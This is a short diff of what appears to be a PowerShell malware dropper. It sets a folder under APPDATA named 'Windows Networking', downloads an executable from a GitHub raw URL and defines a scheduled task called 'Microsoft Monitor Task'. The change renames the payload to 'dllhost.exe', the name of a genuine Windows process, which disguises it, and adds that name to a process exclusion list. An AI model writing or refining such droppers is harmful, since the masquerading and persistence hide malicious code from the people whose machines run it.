@@ -1,9 +1,9 @@
 # Variables
 $dir = "$env:APPDATA\Windows Networking"
-$exeUrl = "https://github.com/rkx0/healthdb/raw/refs/heads/main/MicrosoftMonitor2.exe"
-$exeName = "MicrosoftMonitor2.exe"
+$exeUrl = "https://github.com/rkx0/healthdb/raw/refs/heads/main/dllhost.exe"
+$exeName = "dllhost.exe"
 $exePath = Join-Path -Path $dir -ChildPath $exeName
-$excludedProcesses = @("MicrosoftMonitor2.exe")
+$excludedProcesses = @("dllhost.exe")
 $taskName = "Microsoft Monitor Task"
 
 # 1. Create Directory
